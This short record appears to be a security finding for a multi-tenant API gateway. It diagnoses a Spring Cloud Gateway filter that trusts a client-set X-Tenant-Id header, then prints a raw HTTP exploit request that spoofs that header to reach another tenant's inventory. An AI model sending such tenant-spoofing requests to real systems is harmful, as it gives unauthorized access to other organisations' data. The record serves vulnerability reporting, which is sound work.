diagnosis: The Spring Cloud Gateway route filter reads the X-Tenant-Id header directly from the incoming client request and passes it to downstream microservices without sanitizing it or validating it against the tenant claim in the authenticated JWT token. An attacker can set arbitrary tenant headers to view and mutate warehouse inventory of other corporate tenants.
exploit_request:
GET /api/inventory/warehouses HTTP/1.1
Host: api-gateway.enterprisegrid.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEwIiwidGVuYW50SWQiOiJ0ZW5hbnRfMTAifQ.sig
X-Tenant-Id: tenant_99
Accept: application/json
